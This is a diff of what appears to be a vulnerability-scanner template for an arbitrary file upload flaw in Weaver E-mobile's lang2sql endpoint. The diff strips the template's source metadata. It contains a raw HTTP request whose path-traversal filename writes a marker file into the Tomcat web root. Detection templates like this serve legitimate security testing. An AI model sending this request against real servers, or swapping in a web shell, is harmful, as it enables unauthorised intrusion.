@@ -3,12 +3,8 @@ info:
   name: 泛微 E-mobile lang2sql 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wa1dkp6zy0z5yzzn'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wa1dkp6zy0z5yzzn
-    fofa: 暂无
 http:
 - raw:
   - 'POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
@@ -26,14 +22,10 @@ http:
     Content-Type: multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK
 
 
-
-
     ------WebKitFormBoundarymVk33liI64J7GQaK
 
 
     Content-Disposition: form-data; name="file";filename="../../../../appsvr/tomcat/webapps/ROOT/dudesuite.txt"
-
-
 
 
     dudesuite
